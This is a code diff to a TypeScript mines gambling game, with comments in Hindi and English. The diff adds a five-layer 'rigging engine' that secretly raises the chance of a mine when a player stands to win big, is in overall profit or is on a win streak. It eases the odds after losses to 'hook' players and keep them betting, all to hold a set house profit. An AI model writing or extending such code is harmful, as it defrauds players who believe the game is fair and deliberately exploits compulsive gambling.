@@ -66,6 +66,25 @@ function placeMinesOnRemaining(
   return mines;
 }
 
+/**
+ * Smart Rigging Engine — Decides mine/diamond based on:
+ * 
+ * 1. CURRENT ROUND: Kitna lagaya hai, kitna jeetega agar safe nikla
+ *    → Potential payout = bet × nextMultiplier
+ *    → Jitna zyada payout, utna zyada mine chance
+ * 
+ * 2. CUMULATIVE HISTORY: User ne total kitna lagaya, kitna jeeta
+ *    → Agar user overall profit mein hai → mine probability badhao
+ *    → Agar user overall loss mein hai → thoda easy karo (hook)
+ * 
+ * 3. STREAKS: Consecutive wins/losses
+ *    → 2+ wins → ab crash karo
+ *    → 3+ losses → ek chhota win do (engagement)
+ * 
+ * 4. HOUSE PROFIT TARGET: 40% maintain karna hai
+ *    → Agar house profit < 30% → aggressively crash
+ *    → Agar house profit > 55% → ease up
+ */
 function shouldBeMine(
   mineCount: number,
   safeRevealed: number,
@@ -75,44 +94,127 @@ function shouldBeMine(
   const stats = getStats();
   const config = getConfig();
   const houseProfit = getHouseProfitPercent();
-  const target = config.houseEdgeTarget * 100;
+  const target = config.houseEdgeTarget * 100; // e.g. 40
 
-  const fairProb = mineCount / (gridSize - safeRevealed);
+  // === LAYER 1: Fair base probability ===
+  const remaining = gridSize - safeRevealed;
+  const fairProb = mineCount / Math.max(remaining, 1);
 
+  // First click slightly safe to hook, then escalate
   let riggedProb: number;
   if (safeRevealed === 0) {
-    riggedProb = fairProb * 0.6;
+    riggedProb = fairProb * 0.5; // Very safe first click
   } else if (safeRevealed === 1) {
-    riggedProb = fairProb * 0.85;
-  } else if (safeRevealed <= 3) {
-    riggedProb = fairProb * 1.4;
-  } else if (safeRevealed <= 5) {
-    riggedProb = fairProb * 2.0;
+    riggedProb = fairProb * 0.8;
   } else {
-    riggedProb = fairProb * 3.0;
+    riggedProb = fairProb * (1 + safeRevealed * 0.35); // Linear escalation
   }
 
+  // === LAYER 2: Current round — potential payout analysis ===
+  const nextMult = calculateMultiplier(mineCount, safeRevealed + 1, gridSize);
+  const potentialPayout = currentBet * nextMult;
+  const potentialProfit = potentialPayout - currentBet;
+
+  // Kitna jeetega relative to bet — yeh sabse important factor hai
+  const profitRatio = potentialProfit / Math.max(currentBet, 1);
+
+  if (profitRatio > 8) {
+    // 8x+ profit — almost certainly crash
+    riggedProb *= 4.0;
+  } else if (profitRatio > 4) {
+    // 4-8x profit — very likely crash
+    riggedProb *= 2.8;
+  } else if (profitRatio > 2) {
+    // 2-4x profit — increased danger
+    riggedProb *= 2.0;
+  } else if (profitRatio > 1) {
+    // 1-2x profit — getting risky
+    riggedProb *= 1.5;
+  } else if (profitRatio > 0.5) {
+    riggedProb *= 1.2;
+  }
+  // Under 0.5x profit ratio — let them play (small wins hook them)
+
+  // Absolute payout protection — bade amount nahi jaane dena
+  if (potentialPayout > 5000) riggedProb *= 1.5;
+  if (potentialPayout > 10000) riggedProb *= 2.0;
+  if (potentialPayout > 25000) riggedProb *= 3.0;
+
+  // === LAYER 3: Cumulative user profit/loss ===
   if (stats.totalWagered > 0) {
-    if (houseProfit < target - 10) riggedProb *= 1.6;
-    else if (houseProfit < target - 5) riggedProb *= 1.3;
-    else if (houseProfit > target + 15) riggedProb *= 0.5;
-    else if (houseProfit > target + 8) riggedProb *= 0.7;
+    const userNetProfit = stats.totalPaidOut - stats.totalWagered;
+
+    if (userNetProfit > 0) {
+      // User is in profit overall — recover house money
+      const profitPercent = (userNetProfit / stats.totalWagered) * 100;
+
+      if (profitPercent > 30) {
+        // User won 30%+ of what they wagered — crash hard
+        riggedProb *= 2.5;
+      } else if (profitPercent > 15) {
+        riggedProb *= 1.8;
+      } else if (profitPercent > 5) {
+        riggedProb *= 1.4;
+      }
+    } else {
+      // User is in loss — check if house is too profitable
+      const lossPercent = Math.abs(userNetProfit / stats.totalWagered) * 100;
+
+      if (lossPercent > 60) {
+        // User lost 60%+ — ease up a lot, give hope
+        riggedProb *= 0.3;
+      } else if (lossPercent > 45) {
+        riggedProb *= 0.5;
+      } else if (lossPercent > 35) {
+        // Near target — slight ease
+        riggedProb *= 0.8;
+      }
+    }
+
+    // House profit enforcement (global target)
+    if (houseProfit < target - 15) {
+      // House losing badly — emergency crash mode
+      riggedProb *= 2.0;
+    } else if (houseProfit < target - 8) {
+      riggedProb *= 1.5;
+    } else if (houseProfit > target + 20) {
+      // House too greedy — let user win to keep playing
+      riggedProb *= 0.4;
+    } else if (houseProfit > target + 10) {
+      riggedProb *= 0.6;
+    }
   }
 
-  if (stats.consecutiveWins >= 2) riggedProb *= 1.8;
-  if (stats.consecutiveWins >= 3) riggedProb *= 2.0;
-  if (stats.consecutiveLosses >= 3) riggedProb *= 0.4;
-  if (stats.consecutiveLosses >= 5) riggedProb *= 0.3;
+  // === LAYER 4: Win/Loss streak management ===
+  if (stats.consecutiveWins >= 4) {
+    // 4+ wins in a row — must crash now
+    riggedProb *= 3.5;
+  } else if (stats.consecutiveWins >= 3) {
+    riggedProb *= 2.5;
+  } else if (stats.consecutiveWins >= 2) {
+    riggedProb *= 1.8;
+  }
 
-  const currentMult = calculateMultiplier(mineCount, safeRevealed + 1, gridSize);
-  if (currentMult > 3) riggedProb *= 1.5;
-  if (currentMult > 5) riggedProb *= 1.8;
-  if (currentMult > 10) riggedProb *= 2.5;
+  if (stats.consecutiveLosses >= 5) {
+    // 5+ losses — give them a win, they might leave
+    riggedProb *= 0.15;
+  } else if (stats.consecutiveLosses >= 4) {
+    riggedProb *= 0.25;
+  } else if (stats.consecutiveLosses >= 3) {
+    riggedProb *= 0.4;
+  }
 
-  if (currentBet > 1000) riggedProb *= 1.2;
-  if (currentBet > 5000) riggedProb *= 1.4;
+  // === LAYER 5: Bet size risk ===
+  // Bade bets pe zyada careful — house ka zyada paisa risk pe
+  if (currentBet > 10000) riggedProb *= 1.6;
+  else if (currentBet > 5000) riggedProb *= 1.4;
+  else if (currentBet > 2000) riggedProb *= 1.2;
+  // Chhote bets pe thoda loose raho — user ko confidence aaye
+  else if (currentBet <= 50) riggedProb *= 0.8;
 
-  riggedProb = Math.max(0.03, Math.min(0.90, riggedProb));
+  // === FINAL: Clamp between 2% and 92% ===
+  riggedProb = Math.max(0.02, Math.min(0.92, riggedProb));
+
   return Math.random() < riggedProb;
 }
 
